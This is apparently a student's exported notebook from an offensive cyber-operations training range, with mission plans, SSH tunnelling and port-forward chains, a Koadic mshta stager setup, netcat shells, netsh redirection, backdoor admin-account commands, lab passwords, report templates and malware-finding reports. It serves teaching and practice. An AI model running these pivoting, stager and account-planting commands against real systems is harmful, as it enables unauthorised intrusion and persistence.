R&amp;D<br />-rw-------. 1 root    mail 300K May 11 16:45 root<br />-rw-rw----. 1 rpc     mail    0 Aug  8  2019 rpc<br />drwxr-xr-x. 2 root    root 4.0K May 10 18:09 Supply<br />-rw-rw----. 1 user1   mail    0 May 10 18:07 user1<br />-rw-rw----. 1 user10  mail    0 May 10 18:07 user10<br />-rw-rw----. 1 user11  mail    0 May 10 18:07 user11<br />-rw-rw----. 1 user12  mail    0 May 10 18:07 user12<br />-rw-rw----. 1 user13  mail    0 May 10 18:07 user13<br />-rw-rw----. 1 user14  mail    0 May 10 18:07 user14<br />-rw-rw----. 1 user15  mail    0 May 10 18:07 user15<br />-rw-rw----. 1 user16  mail    0 May 10 18:07 user16<br />-rw-rw----. 1 user17  mail    0 May 10 18:07 user17<br />-rw-rw----. 1 user18  mail    0 May 10 18:07 user18<br />-rw-rw----. 1 user19  mail    0 May 10 18:07 user19<br />-rw-rw----. 1 user2   mail    0 May 10 18:07 user2<br />-rw-rw----. 1 user20  mail    0 May 10 18:07 user20<br />-rw-rw----. 1 user21  mail    0 May 10 18:07 user21<br />-rw-rw----. 1 user22  mail    0 May 10 18:07 user22<br />-rw-rw----. 1 user23  mail    0 May 10 18:07 user23<br />-rw-rw----. 1 user3   mail    0 May 10 18:07 user3<br />-rw-rw----. 1 user4   mail    0 May 10 18:07 user4<br />-rw-rw----. 1 user5   mail    0 May 10 18:07 user5<br />-rw-rw----. 1 user6   mail    0 May 10 18:07 user6<br />-rw-rw----. 1 user7   mail    0 May 10 18:07 user7<br />-rw-rw----. 1 user8   mail    0 May 10 18:07 user8<br />-rw-rw----. 1 user9   mail    0 May 10 18:07 user9<br /></div><div class='page'><h1 class='title level-4'>Eval03</h1><br/>&gt;T1: 10.50.31.111   EXT_RTR     Linux       SSH in. Vet. Redir T2.<br />    -&gt;T2: 10.20.169.122     STORAGE1    Windows     SSH in. Vet. Redir T3.<br />        --&gt;T3: 10.20.169.238    Vyos1   Linux   SSH in. Vet. Redir T4.<br />            ---&gt; T4: 192.168.169.43     ADMIN1      Linux       SSh in. Vet. Ask Analys/MC If they want Survey. Collect FOI. Redir T5, T7.<br />                ----&lt; T5: 192.168.169.111   UNK     Windows     Tell analyst you are ready to Catch. Catch NC shell. Vet. Collect FOI. netsh to T6.<br />                    -----&gt; T6: 192.168.169.122      Unk     Linux       SSH in. Vet. Survey. Get user accounts. record login data?. BURNOFF. Kill NetSH rule. Burnoff T5.<br />                ----&gt; T7: 192.168.169.113   Unk     Windows     SSH in. Vet. Survey. Get User Accounts. record login data? Confrim T10 effect. Maybe do T10 Effect. BurnOff.<br /><br /><br />10.50.31.111<br />10.20.169.122<br />10.20.169.238<br />192.168.169.43<br />192.168.169.111<br />192.168.169.122<br />192.168.169.113<br /><br /><br />ssh -M -S /tmp/t1 -p 10123 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.31.111 -L10200:10.20.169.122:52203<br /><strong>engineer14::enshallah</strong><br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -L10300:10.20.169.238:52230<br /><strong>caisson14::tread_depth</strong><br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -L10400:192.168.169.43:33125<br /><strong>NOC_Admin14::5gftE8DCc8</strong><br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1 -L10700:192.168.169.113:33521  -L:10601:192.168.169.111:60014<br /><strong>user14::P455w0rd </strong><br />ssh -S /tmp/t4 dummy@127.0.0.1 -O forward -R8014:127.0.0.1:10500<br />ssh -S /tmp/t4 dummy@127.0.0.1 -O cancel -R8014:127.0.0.1:10500<br />ssh -S /tmp/t4 dummy@127.0.0.1 -O forward -R192.168.169.43:8014:127.0.0.1:10500<br />ssh -S /tmp/t4 dummy@127.0.0.1 -O cancel -R192.168.169.43:127.0.0.1:10500<br /><br /><br />nc -nlv 127.0.0.1 -p 10500<br />netsh interface portproxy show all<br />netsh interface portproxy set v4tov4 listenport=60014 listenaddress=192.168.169.111 connectaddress=192.168.169.122 connectport=33521 protocol=tcp<br />netstat -nato | findstr 60014<br />netsh interface portproxy delete v4tov4 listenport=60014 listenaddress=192.168.169.111 protocol=TCP<br /><br /><br />ssh -M -S /tmp/t6 -p 10601 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1<br />user14::P455w0rd<br /><br /><br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1<br />user14::P455w0rd<br /><br />net user user43 /add Y33TCann0n!!! <br />net localgroup administrators /add user43 <br /><br /><br /><br /><br /><br /><br /><br /><br /><strong>engineer14::enshallah<br />caisson14::tread_depth<br />NOC_Admin14::5gftE8DCc8<br />user14::P455w0rd</strong></div><div class='page'><h1 class='title level-5'>T7</h1><br/>Be advised: I got a weird responce when moving to T7. I anticipate that potentially the local port I am using could be pointing somewhere else (not something I did).  Here is my setup followed by the responce I recieved.<br /><br />root@kali:~/schmid_12-05-21_Eval03# ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1 -L10700:192.168.169.113:33521 <br /><br />root@kali:~/schmid_12-05-21_Eval03# ssh -M -S /tmp/t7-p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1<br />ssh: connect to host 0.0.41.204 port 22: Connection timed out<br /><br />I would like permission to connect again while port forwarding 10701 instead of 10700 in an attempt to maneuver past this issue.<br /></div><div class='page'><h1 class='title level-4'>Eval04</h1><br/>LP: 10.50.28.172    koa-lp      Linux       SSH in. Vet. Start koadic. Config Koadic stagers. Redir to T1 via ssh.<br />-------------------------------<br />    -&gt;T1: 10.50.27.67, 10.180.169.253   koa-ext-rtr     Linux       SSH in. Vet. Redir T2-5.<br />        --&lt;T2: 10.180.169.17    UNK     Windows     Connect Through koadic. Vet. Survey. BurnOff.<br />        --&lt;T3: 10.180.169.16    Unk     Windows     Connect Through Koadic. Vet. Survey. BurnOFF.<br />        --&lt;T4: 10.180.169.9     UNK     Windows     Connect Through Koadic. Vet. Survey. BurnOFF.<br />        --&lt;T5: 10.180.169.20    UNK     Windows     Connect Through Koadic. Vet. Survey BurnOFF.<br /><br /><br />10.50.28.172    <br />10.50.27.67   <br />10.180.169.17    <br />10.180.169.16    <br />10.180.169.9   <br />10.180.169.20   <br /><br /><br /><br />ssh -M -S /tmp/t0 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.28.172 -L10100:10.50.27.67:22<br />student14::password14<br /><br /><br />ssh -M -S /tmp/t1 -p 10100 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_admin14@127.0.0.1 <br /><strong>NOC_admin14::7XBPRzyKsUWBeI3puA</strong><br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -R10.180.169.253:14229:10.50.28.172:14229<br /><br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -R10.180.169.253:14228:10.50.28.172:14228<br /><br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -R10.180.169.253:14227:10.50.28.172:14227<br /><br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -R10.180.169.253:14226:10.50.28.172:14226<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />(koadic: sta/js/mshta)# listeners <br /><br />        ID  IP              PORT  ENDPOINT  TYPE                <br />        --  --              ----  --------  ----                <br />        0   10.180.169.253  14229 may       stager/js/mshta     <br />        1   10.180.169.253  14228 thefoce   stager/js/mshta     <br />        2   10.180.169.253  14227 bewith    stager/js/mshta     <br />        3   10.180.169.253  14226 you       stager/js/mshta <br /><br />(koadic: sta/js/mshta)# listeners 0<br />[&gt;] mshta <a href="http://10.180.169.253:14229/may">http://10.180.169.253:14229/may</a><br />(koadic: sta/js/mshta)# listeners 1<br />[&gt;] mshta <a href="http://10.180.169.253:14228/thefoce">http://10.180.169.253:14228/theforce</a><br />(koadic: sta/js/mshta)# listeners 2<br />[&gt;] mshta <a href="http://10.180.169.253:14227/bewith">http://10.180.169.253:14227/bewith</a><br />(koadic: sta/js/mshta)# listeners 3<br />[&gt;] mshta <a href="http://10.180.169.253:14226/you">http://10.180.169.253:14226/you</a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><strong>NOC_admin14::7XBPRzyKsUWBeI3puA</strong></div><div class='page'><h1 class='title level-4'>Eval05</h1><br/>&gt;T1: 10.50.31.111   EXT_RTR     Linux       SSH in. Vet. Redir T2.<br />    -&gt;T2: 10.20.169.13      FILESVR     Windows       SSH in. Vet. Redir T3.<br />        --&gt;T3: 10.20.169.239    Vyos2   Linux       SSH in. Vet. Redir T4.<br />            ---&gt;T4: 192.186.169.133     Admin2      Linux       SSH in. Vet. Survey. Report FOI. Collect SSH keys. Scan. Redir T5,T6.<br />                ----&gt;T5: Suspected mail server?     Unk     Unk     SSH in. Vet. Survey. Catalog accounts. Collect Emails. BURNOFF.<br />                ----&gt;T6: Suspected mail server?     UNK     UNK     SSH in. Vet. Survey. Catalog accounts. Collect Emails. CONCLUDE OPP.<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 10123 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.31.111 -L10200:10.20.169.13:52203<br /><strong>engineer14::enshallah</strong><br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -L10300:10.20.169.239:52230<br /><strong>caisson14::tread_depth</strong><br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -L10400:192.186.169.133:33157<br /><strong>NOC_Admin14::AhmdLxu29D</strong><br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -D127.0.0.1:9050<br /><strong>askar14::DaXedayLasarah</strong><br />ssh -S /tmp/t4 dummy@127.0.0.1 -O cancel -D127.0.0.1:9050<br />ssh -S /tmp/t4 dummy@127.0.0.1 -O forward -L10500:10.101.169.30:33501<br />ssh -S /tmp/t4 dummy@127.0.0.1 -O forward -L10600:10.101.169.35:33501<br /><br /><br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <strong>askar14</strong>@127.0.0.1<br /><strong>askar14::DaXedayLasarah</strong><br /><br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <strong>askar14</strong>@127.0.0.1<br /><strong>askar14::DaXedayLasarah</strong><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><strong>engineer14::enshallah<br />caisson14::tread_depth<br />NOC_Admin14::AhmdLxu29D</strong><br /><strong>askar14::DaXedayLasarah</strong><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Eval06</h1><br/>&gt;T1: 10.50.31.111       EXT_RTR     Linux       SSH in. Vet. Redir T2.<br />    -&gt;T2: 10.20.169.10      CHATSVR     Windows     SSH in. Vet. Redir T3.<br />        --&gt;T3: 10.20.169.239    Vyos2       Linux       SSH in. Vet. Redir T4.<br />            ---&gt; T4: 192.186.169.133    Admin2      Linux       SSH in. Vet. Survey  (if not already complete). Collect FOI &amp; (ssh key). Redir T5, T6, T7.<br />                ----&gt; T5: 192.186.169.201       Unk     Linux       Shell with NC. Vet. Survey (get commands from analyst). Catalog user accounts and login data. BURNOFF.<br />                ----&gt; T6: 192.186.169.202       UNK     Windows     SSH in. Vet. Survey. Catalog User accounts and login data. BURNOFF.<br />                ----&gt; T7: 192.186.169.203       UNK     Windows     SSH in. Vet. Survey. Catalog User Accounts and login data. Conclude Mission.<br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 10123 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.31.111 -L10200:10.20.169.10:52203<br /><strong>engineer14::enshallah</strong><br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -L10300:10.20.169.239:52230<br /><strong>caisson14::tread_depth</strong><br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -L10400:192.186.169.133:33157<br /><strong>NOC_Admin14::AhmdLxu29D</strong><br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -L10500:192.186.169.201:44714 -L10600:192.186.169.202:33715 -L10700:192.186.169.203:33715<br /><strong>askar14::DaXedayLasarah</strong><br /><br /><br />T5:     nc 127.0.0.1 10500<br /><br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1<br /><strong>askar14::DaXedayLasarah</strong><br /><br /><br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1<br /><strong>askar14::DaXedayLasarah</strong><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><strong>engineer14::enshallah<br />caisson14::tread_depth<br />NOC_Admin14::AhmdLxu29D</strong><br /><strong>askar14::DaXedayLasarah</strong><br /></div><div class='page'><h1 class='title level-4'>Eval08</h1><br/>&gt;T1: 10.50.31.111       EXT_RTR     Linux       SSH in. Vet. Redir T2.<br />    -&gt;T2: 10.20.169.30      Storage2       Windows      SSH in. Vet. Redir T3.<br />        --&gt;T3: 10.20.169.239    Vyos2       Linux       SSH in. Vet. Redir T4.<br />            ---&gt;T4: 192.186.169.133     Admin2      Linux       SSH in. Vet. Report FOI. Collect SSH keys (confirm w analyst). Redir T5,6,7,8.<br />                ----&gt;T5: 192.186.169.201,129.168.169.201    USER21      Linux   NC in. Vet. Perform Survey (IFNAC). BURNOFF.<br />                ----&gt;T6: 192.186.169.134    UNK         LInux       SSH in. Vet. Survey. BURNOFF.<br />                ----&gt;T7: 192.186.169.144    UNK         Windows         SSH in. Vet. Survey. BURNOFF.<br />                ----&gt;T8: 192.186.169.142    USER24  Linux       Verify Hash with MC. SSH in (w id_rsa). Vet. Survey. Add User. Conclude Op.<br /><br /><br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 10123 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.31.111 -L10200:10.20.169.30:52203<br /><strong>engineer14::enshallah</strong><br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -L10300:10.20.169.239:52230<br /><strong>caisson14::tread_depth</strong><br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -L10400:192.186.169.133:33157<br /><strong>NOC_Admin14::AhmdLxu29D</strong><br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -L10500:192.186.169.201:44714 -L10600:192.186.169.134:33715 -L10700:192.186.169.144:33715 -L10800:192.186.169.142:33715<br /><strong>askar14::DaXedayLasarah</strong><br /><br /><br />nc 127.0.0.1 10500<br /><br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 <br /><strong>askar14::DaXedayLasarah</strong><br /><br /><br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 <br /><strong>askar14::DaXedayLasarah</strong><br /><br />ssh -M -S /tmp/t8 -p 10800 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -i ./T4-id_rsa<br />useradd y.cannon.32 -p &quot;YeetCannon123!@#&quot; -c &quot;buoyant alligator&quot; -s /bin/bash -m<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><strong>engineer14::enshallah<br />caisson14::tread_depth<br />NOC_Admin14::AhmdLxu29D</strong><br /><strong>askar14::DaXedayLasarah</strong></div><div class='page'><h1 class='title level-3'>BOC_Clean</h1><br/><br />▸ <a href="Other--BOC--BOC_Clean.html">BOC_Clean</a><br />	▸ <a href="Other--BOC--BOC_Clean--SOP.html">SOP</a><br />		▸ <a href="Other--BOC--BOC_Clean--SOP--Admin_Notes.html">Admin Notes</a><br />	▸ <a href="Other--BOC--BOC_Clean--Reporting.html">Reporting</a><br />		▸ <a href="Other--BOC--BOC_Clean--Reporting--Abnormal_Logging.html">Abnormal Logging</a><br />		▸ <a href="Other--BOC--BOC_Clean--Reporting--Debrief.html">Debrief</a><br />		▸ <a href="Other--BOC--BOC_Clean--Reporting--Malware.html">Malware</a><br />		▸ <a href="Other--BOC--BOC_Clean--Reporting--Privileged_User.html">Privileged User</a><br />		▸ <a href="Other--BOC--BOC_Clean--Reporting--Security_Products.html">Security Products</a><br />		▸ <a href="Other--BOC--BOC_Clean--Reporting--OpNotes.html">OpNotes</a><br />	▸ <a href="Other--BOC--BOC_Clean--SA.html">SA</a><br />		▸ <a href="Other--BOC--BOC_Clean--SA--Linux.html">Linux</a><br />			▸ <a href="Other--BOC--BOC_Clean--SA--Linux--For_me.html">For me</a><br />			▸ <a href="Other--BOC--BOC_Clean--SA--Linux--QuickPaste.html">QuickPaste</a><br />			▸ <a href="Other--BOC--BOC_Clean--SA--Linux--Survey.html">Survey</a><br />		▸ <a href="Other--BOC--BOC_Clean--SA--Windows.html">Windows</a><br />			▸ <a href="Other--BOC--BOC_Clean--SA--Windows--For_Me.html">For Me</a><br />			▸ <a href="Other--BOC--BOC_Clean--SA--Windows--Survey.html">Survey</a><br />	▸ <a href="Other--BOC--BOC_Clean--Tools_&_Techniques.html">Tools &amp; Techniques</a><br />		▸ <a href="Other--BOC--BOC_Clean--Tools_&_Techniques--iptables.html">iptables</a><br />			▸ <a href="Other--BOC--BOC_Clean--Tools_&_Techniques--iptables--Example.html">Example</a><br />		▸ <a href="Other--BOC--BOC_Clean--Tools_&_Techniques--Tunneling.html">Tunneling</a><br />			▸ <a href="Other--BOC--BOC_Clean--Tools_&_Techniques--Tunneling--Class_Notes.html">Class Notes</a><br />			▸ <a href="Other--BOC--BOC_Clean--Tools_&_Techniques--Tunneling--netsh.html">netsh</a><br />		▸ <a href="Other--BOC--BOC_Clean--Tools_&_Techniques--Scp.html">Scp</a><br />	▸ <a href="Other--BOC--BOC_Clean--Missions.html">Missions</a></div><div class='page'><h1 class='title level-4'>SOP</h1><br/>Setup OpStation<br />	ssh kali@ip -X<br />		cherrtytree &amp;<br />		tilix &amp;<br />		qterminal &amp;<br /><br />read Daily Read<br />read Mission plan...<br />See If Mission Plan IP&#39;s are covered by NSDB<br />Script Tunnels and Shorthand Gameplan<br />Setup Tmux in tilix<br />Setup Notes in qterminal<br />Confrim IP&#39;s With MC<br /><br /><br />Operate...<br /><br /><br />Make sure you Told MC about All Disco&#39;s<br />Debrief the MC<br />archive<br />close notes<br />Create NSDB<br />close NSDB<br />exit (to close term screen) on each terminal)<br />cd ..<br />tar -cvf STUD_NAME_20-04-21_MM1.tar   STUD_NAME_20-04-21_MM1<br />scp STUD_NAME_20-04-21_MM1.tar studentxx@10.50.24.17:~<br />password14<br />verify reception<br /><br /><br /><br /><br /><br />on Kali (through x11)<br />date=20-05-21<br />miss=Eval08<br />targs=8<br />dm=$date\_$miss<br />mkdir /root/STUD_NAME_$dm<br />cd /root/STUD_NAME_$dm<br />cp /root/NotesTemplate /root/STUD_NAME_$dm/notes_$date<br />cp /root/NSDBTemplate /root/STUD_NAME_$dm/NSDB_$date<br />touch Survey_0.0.0.0<br /><br />tmux new-session -s Targets -d -n KaliTarget<br />tmux send-keys -t Targets:0  cd Space /root/STUD_NAME_$dm Enter script Space -af Space termscreen.$RANDOM Enter<br />for i in $(seq 1 $targs); do<br />    tmux new-window -t Targets:$i -n T$i -d<br />    tmux send-keys -t Targets:$i cd Space /root/STUD_NAME_$dm Enter script Space -af Space termscreen.$RANDOM Enter<br />done<br /><br />tmux new-session -s Masters -d -n KaliMaster<br />tmux send-keys -t Masters:0  cd Space /root/STUD_NAME_$dm Enter script Space -af Space termscreen.$RANDOM Enter<br />for i in $(seq 1 $targs); do<br />    tmux new-window -t Masters:$i -n T$i -d<br />    tmux send-keys -t Masters:$i  cd Space /root/STUD_NAME_$dm Enter script Space -af Space termscreen.$RANDOM Enter<br />done<br /><br /><br /><br /><br /><br /><br />cd ..<br />tar -cvf STUD_NAME_$date\_$miss.tar STUD_NAME_$date\_$miss<br />scp STUD_NAME_$date\_$miss.tar studentxx@10.50.24.17:~<br />password14<br />verify reception<br /></div><div class='page'><h1 class='title level-5'>Admin Notes</h1><br/><a href="https://register.cybbh.space/v2/?OVERRIDE">https://register.cybbh.space/v2/?OVERRIDE</a><br /><a href="https://ipa.cybbh.space/ipa/ui/#/e/user/details/ccschmi">https://ipa.cybbh.space/ipa/ui/#/e/user/details/</a><br /><a href="https://git.cybbh.space/users/sign_in">https://git.cybbh.space/users/sign_in</a><br /><a href="https://vta.cybbh.space/horizon/auth/login/">https://vta.cybbh.space/horizon/auth/login/</a><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Reporting</h1><br/>SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# and IP<br />Name:  <br />Version:  <br />Primary registry key / Config &amp; Installation location on *nix:<br /><br />### NSDB extras ###<br />Installation folder:  <br />Location of logs:<br />Timestamp of Discovery:<br />Timestamp of all associated log files:<br />Cloud based?  Y or N<br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do:  <br />*****End of Report*****<br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Abnormal Logging Report*****<br />Target: T# and IP<br />Name:  <br />PID:  <br />PPID:  <br />User:  <br />Location of config file:  <br />Remote hostname or IP:  <br />Network connections:<br />Description:<br /><br />### NSDB extras ###<br />Process options:<br />Hash:<br />File type of malware &amp; supporting files:<br />Associated logs:<br />Location and lines of persistence:  <br />Malware file and support files full paths:<br />Open/established network connections:<br />Identifiable text:<br />Any modules loaded by malware:<br />Describe purpose/activities/capabilities:<br />Recommendation on what to do:<br />*****End of Report*****<br /><br /><br /><br />ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T1 and IP<br />Name:  <br />PID:  <br />PPID:  <br />User:  <br />Location of config:  <br />Remote hostname or IP:  <br />Network connections:  <br />Description:<br /><br />### NSDB extras ###<br />Process options:<br />Unusual config options:<br />Hostname or IP of where logs are sent:<br />Established or listening network connections:<br />Description:  <br />Recommendation:  <br />*****End of Report*****<br />Why is it abnormal?<br /><br /><br /><br /><br />PRIVILEGED USER<br /><br />*****Privileged User Report*****<br />Target:<br />Username:<br />Access Method:<br />Access Time:<br />Activity:<br />Running files/executables:  <br />Network Connections:<br />Description:<br />Recommendation:<br />*****End of Report*****<br /><br /> SELINUX<br /><br />    • Best to cut and paste setstatus<br />    • enforcing or permissive<br />    • version<br /><br />*****SELinux Report*****<br />Target:<br />Enforcing or Permissive:  <br />Version:<br />Command Output:  <br />*****End of Report****<br /><br />II.  Op Notes<br /><br />1.  Mission start / end time<br />2.  Connect / Disconnect Time for each Target<br />3.  Start and end timestamps of &quot;Upon Connection&quot; and &quot;Before Disconnect&quot; vetting command sections<br />4.  Full output of vetting commands is not required<br /><br />III.  Collection reports to Analyst<br /><br />1.  Completion of all analyst tasks (survey, collect, scanning)<br />2.  Hash all collected files on target and ops station.<br />3.  Survey Notes<br />    • Start and end timestamps of &quot;Analyst Survey Commands&quot;<br />    • Students will create a seperate file for every device they survey with the full output of the survey commands. Naming convention will be &quot;Survey_&lt;IP_Address&gt;&quot;.<br /><br />IV.  Post-op<br /><br />1.  All files go into OPSDIR.<br />2.  Submit DEBRIEF to MC.<br />      – Description plus ADMIN USER REPORT plus one sentence per target<br />3.  tar -cvf OPSDIR.tar OPSDIR/<br />4.  scp OPSDIR.tar student3@10.50.24.17:~<br /><br />DON’T FORGET TO REPORT ADMIN USERS IN DEBRIEF<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Abnormal Logging</h1><br/>ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T1 and IP<br />Time:<br />Name:  <br />PID:  <br />PPID:  <br />User:  <br />Location of config:  <br />Remote hostname or IP:  <br />Network connections:  <br />Description:<br /><br />### NSDB extras ###<br />Process options:<br />Unusual config options:<br />Recommendation:  <br />Why is it abnormal?:<br />*****End of Report*****<br /><br /></div><div class='page'><h1 class='title level-5'>Debrief</h1><br/>***** MC DEBRIEF *****<br />Operator: Studentxx<br />Operation: NotAnOp<br />MC: MC2<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux.  Redirected T2<br />T2:  Submitted privuser (administrator), logfusion. redirected T3 using netsh.<br />T3:  Submitted cetnOS.rtr, SElinux.  Redir to T4.<br />T4:  Submitted ProcAccounting, Selinux. Surveyed.  Redirect to T5.<br />T5:  Submitted privileged user (root), rcpdump, rsyslog. Surveyed. Collected 5 files.  Redirected to T6 via iptables.<br />T6:  Submitted nothing. Survey.  Collected files files.<br />T7:  Submitted  PrivUser Administrator), kasperski. Survey.<br />***** END OF REPORT***** <br /><br /></div><div class='page'><h1 class='title level-5'>Malware</h1><br/>MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# and IP<br />Time:<br />Name:  <br />PID:  <br />PPID:  <br />User:  <br />Location of config file:  <br />Remote hostname or IP:  <br />Network connections:<br />Description:<br /><br />### NSDB extras ###<br />Process options:<br />Hash:<br />File type of malware &amp; supporting files:<br />Associated logs:<br />Location and lines of persistence:  <br />Identifiable text:<br />Any modules loaded by malware:<br />Recommendation on what to do:<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****MalwareReport*****<br />Target: T#5 and IP 10.145.117.16<br />Time: 2021/05/07 - 10:25<br />Name:  centOS.rtr.updtr<br />PID:  1687<br />PPID:  1<br />User:  root<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections: 41481 listening<br />Description: This appears to just be a listening nc with no execution arguments. NOTE: This hash is not identifed as nc via VirusTotal. I still belive this is a renamed nc binary<br /><br />### NSDB extras ###<br />Process options: /bin/centOS.rtr.updtr -nklvp 41481<br />Hash: fd48f372b0a814108d6624de07fb3ed5<br />File type of malware &amp; supporting files: ELF.<br />Associated logs: /etc/centOS.rtr.conf<br />Location and lines of persistence: NONE<br />Malware file and support files full paths:/bin/centOS.rtr.updtr<br />Open/established network connections:41481 listennig<br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 4 and IP 192.168.117.104<br />Time:2021/05/04 - 09:38<br />Name:  Reptile<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: /Reptile/configs/defconfig<br />Remote hostname or IP:  na<br />Network connections: na<br />Description: Reptile is a known rootkit from GitHub. This could be the reason behind the root tty bash shell not showing in w.<br /><br />### NSDB extras ###<br />Process options: na<br />Hash: <a href="https://github.com/f0rb1dd3n/Reptile">https://github.com/f0rb1dd3n/Reptile</a><br />File type of malware &amp; supporting files: Uncompiled C and config (ml) files<br />Associated logs: na<br />Location and lines of persistence:  /etc/crontab   /Reptile/reptile_cmd tcp 666 hide<br />Malware file and support files full paths:/Reptile/*<br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 5 and IP 192.168.117.105<br />Time:2021/05/04 - 10:50<br />Name:  nmap.exe<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description:nmap is a network scanning tool.<br /><br />### NSDB extras ###<br />Process options:na<br />Hash:4327397f1854d452a8a4c8dc47767383<br />File type of malware &amp; supporting files:na<br />Associated logs:na<br />Location and lines of persistence:na  <br />Malware file and support files full paths:C:\nmap.exe<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br 